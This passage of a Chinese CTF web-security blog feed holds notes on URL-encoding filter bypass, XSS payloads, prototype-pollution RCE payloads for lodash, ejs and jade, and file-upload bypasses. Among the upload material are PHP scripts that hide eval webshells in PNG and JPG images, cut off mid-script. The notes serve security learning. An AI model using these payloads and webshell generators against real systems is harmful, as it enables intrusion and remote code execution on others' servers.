title="url编码绕过"></a>url编码绕过</h2><p>当先过滤再url解码时有用<br>比如网页有curl功能，访问file:&#x2F;&#x2F;&#x2F;flag即可得到flag，但是flag被过滤了，这时可以利用url编码，file:&#x2F;&#x2F;&#x2F;%66%6c%61%67，进行绕过。curl的时候由于可以访问url编码后的网页<br>浏览器搜索框和burpsuite会自动对url进行解码一次，因此在这二者中需要多编码一次。变成<br>file:&#x2F;&#x2F;&#x2F;%2566%256c%2561%2567，即对%进行编码，其实编码第一个%即可，因为这样后端收到的就是 file:&#x2F;&#x2F;&#x2F;%66lag 了，自然可以绕过。</p><p>2025&#x2F;3&#x2F;2 edit:</p><p>burpsuite和浏览器不会对url进行解码,而是访问php页面,存储到get或者post数组时会解码一次.<br>而$_SERVER[‘QUERY_STRING’]不会进行解码</p><p>python中requests会自动对请求进行url编码(encode)</p>]]></content>
    
    
    <categories>
      
      <category>tricks</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/blogs/xss/xss/"/>
    <url>/blogs/xss/xss/</url>
    
    <content type="html"><![CDATA[<p>fuzz:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span> </span></span><br></code></pre></td></tr></table></figure><ol><li>闭合标签之后<script></script></li><li>onfocus属性</li><li>javascript协议 javascript:alert(0), 另外由于href可以自动解码unicode，因此编码成如下结果也是有效的。</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><ol start="4"><li>type&#x3D;”hidden”的情况可以在前面插入一个type，会忽略掉第二个type</li><li>大小写绕过 <Script></ScrIpt>也有效</li><li>onerror属性</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt; 欢迎用户&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure><p>同理：onmouseover等属性也可以</p><ol start="8"><li>双写绕过</li><li>ng-include传递一个有xss的外部页面，再对传入的页面进行触发。传入文件时需要引号包围<br>![[Pasted image 20241229211503.png]]<br>默认情况下，包含的文件需要包含在同一个域名下<br>![[Pasted image 20250113002903.png]]</li><li>图片xss<br>![[Pasted image 20250113001101.png]]</li><li>回车可以代替空格</li></ol>]]></content>
    
    
    <categories>
      
      <category>xss</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>原型链污染</title>
    <link href="/blogs/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/blogs/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><p><a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">文章</a></p><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p><a href="https://xz.aliyun.com/t/10032">文章</a><br><a href="https://www.anquanke.com/post/id/248170">lodash模块漏洞</a></p><p>常用payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-number">1</span>&#125;&#125;<br><span class="hljs-comment">// 配合lodash.template进行rce</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;sourceURL&quot;</span>:<span class="hljs-string">&quot;\u000areturn e =&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&#125;&quot;</span>&#125;&#125;<br><span class="hljs-comment">// 配合express的render方法进行rce</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);var __tmp2&quot;</span>&#125;&#125;<span class="hljs-comment">// ejs 模版引擎 version &lt; 3.1.7</span><br>&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;compileDebug&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;self&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;line&quot;</span>:<span class="hljs-string">&quot;console.log(global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;whoami\&#x27;))&quot;</span>&#125;&#125; <span class="hljs-comment">// jade 模板引擎</span><br><br></code></pre></td></tr></table></figure><p>模块中的漏洞见如上链接.<br>![[Pasted image 20250115112602.png]]<br>一个简单的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">object1 = &#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-number">2</span>&#125;;<br>object1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">foo</span> = <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object1.<span class="hljs-property">foo</span>);<br>object2 = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-number">2</span>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object2.<span class="hljs-property">foo</span>);<br></code></pre></td></tr></table></figure><p>这里object2本来没有foo属性，可见object2.proto和object1是共享的。这样所有的object都带上了这个属性。</p><p>常见的攻击点：merge \ Object.assign</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target)         &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> object1 = &#123;&#125;<br><span class="hljs-keyword">let</span> object2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-title function_">merge</span>(object1, object2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object1.<span class="hljs-property">a</span>, object1.<span class="hljs-property">b</span>)<br><br>object3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure><p>递归merge, 会存在这样一个操作, object1.proto.b &#x3D; object2.proto.b; 所以object的原型被污染,都带上了b,且值为2</p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>修改app._static_folder为根目录，达成任意文件读<br>在模板注入+污染时，如果过滤了<code>&#123;</code>， 可以考虑污染app.jinja_env.variable_start_string</p>]]></content>
    
    
    <categories>
      
      <category>原型链污染</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>拿到题目后的思路</title>
    <link href="/blogs/tricks/%E6%8B%BF%E5%88%B0%E9%A2%98%E7%9B%AE%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <url>/blogs/tricks/%E6%8B%BF%E5%88%B0%E9%A2%98%E7%9B%AE%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>目录扫描<br>git源码泄露<br>备份文件<br>没信息的时候记得看一眼bp 。。。<br>看看有没有附件或者提示。。。</p>]]></content>
    
    
    <categories>
      
      <category>tricks</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/blogs/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/blogs/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<p>首先进行fuzz测试</p><p><a href="#%E4%B8%8A%E4%BC%A0%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87">上传拦截绕过</a><br><a href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89">条件竞争</a></p><h2 id="上传拦截绕过"><a href="#上传拦截绕过" class="headerlink" title="上传拦截绕过"></a>上传拦截绕过</h2><h3 id="1-黑名单"><a href="#1-黑名单" class="headerlink" title="1. 黑名单"></a>1. 黑名单</h3><p><strong>黑白名单判断：</strong><br>传递一个不存在的后缀，如果能上传说明是黑名单<br>如果是黑名单，可以遍历可利用的后缀字典，看看有没有漏掉过滤的。</p><ul><li>windows下<ul><li>大小写绕过</li><li>空格、点、<code>::$DATA</code> 绕过<br>  windows保存文件的时候会自动去掉文件末尾多余的<code>.</code>和<code>空格</code>和<code>::$DATA</code>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;a.php::$DATA&#x27;</span>, <span class="hljs-string">&quot;hello world&quot;</span>);<br></code></pre></td></tr></table></figure></li></ul></li><li>%00截断 <code>php-version&lt;5.3.4</code></li><li>phphpp绕过</li><li>制作图片马, 可绕过exif_imagetype(), getimagesize()</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy smi1e.jpg /b + shell.php /a shell.jpg<br></code></pre></td></tr></table></figure><ul><li><p>imagecreatefrom???(二次渲染)<br><a href="https://xz.aliyun.com/news/2337">学习文章</a></p><ul><li><p>gif<br>  只需要找到渲染前后没有变化的部分,插入一句话木马即可</p></li><li><p><a href="https://3wapp.github.io/Image/png.html">png</a></p><ul><li>写入PLTE并修改CRC<br>  <strong>payload</strong>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// made by mekrina 2025/3/9</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;&lt;?=@eval($_POST[1]);?&gt;&#x27;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>) % <span class="hljs-number">3</span> != <span class="hljs-number">0</span>)&#123;<br><span class="hljs-variable">$payload</span> .= <span class="hljs-string">&#x27;0&#x27;</span>; <span class="hljs-comment">// rgb三通道</span><br>&#125;<br><span class="hljs-variable">$width</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$height</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>) / <span class="hljs-number">3</span>; <span class="hljs-comment">// 像素数目</span><br><span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">imagecreate</span>(<span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$index</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$index</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$index</span>+=<span class="hljs-number">3</span>)&#123;<br><span class="hljs-variable">$color_index</span> = [<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$index</span>]), <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$index</span>+<span class="hljs-number">1</span>]), <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$index</span>+<span class="hljs-number">2</span>])];<br><span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$image</span>, <span class="hljs-variable">$color_index</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$color_index</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$color_index</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$index</span>/<span class="hljs-number">3</span>, <span class="hljs-variable">$color</span>);<br>&#125;;<br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$image</span>, <span class="hljs-string">&#x27;1.png&#x27;</span>);<br><span class="hljs-title function_ invoke__">imagedestroy</span>(<span class="hljs-variable">$image</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;索引彩色PNG图片已生成：1.png&quot;</span>;<br></code></pre></td></tr></table></figure></li><li>写入IDAT数据块<br>  写入结果</li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  脚本</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br><span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br><span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br><span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br><span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br><span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br><span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br><span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br><span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br><span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br><span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>jpg<br>  先随便拿一个正常jpg文件经过php二次渲染</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-string">&quot;normal.jpg&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$im</span>);<br><span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>, <span class="hljs-string">&#x27;php_fit_normal.jpg&#x27;</span>);<br></code></pre></td></tr></table></figure><p>  然后使用<code>php exp.php php_fit_normal.jpg</code>生成payload.jpg<br>  <strong>payload</strong></p></li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">   It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">   2) Save the processed image and launch:</span><br><span class="hljs-comment">   jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">   1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">   2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">   If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   See also:</span><br><span class="hljs-comment">   https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   */</span><br><br>   <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=@eval(<span class="hljs-subst">$_POST</span>[1]);?&gt;&quot;</span>;<br><br><br>   <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>   &#125;<br><br>   <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>   &#125;<br><br>   <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>       <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>       <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>       <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>       <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>       <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>       &#125;<br><br>       <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; 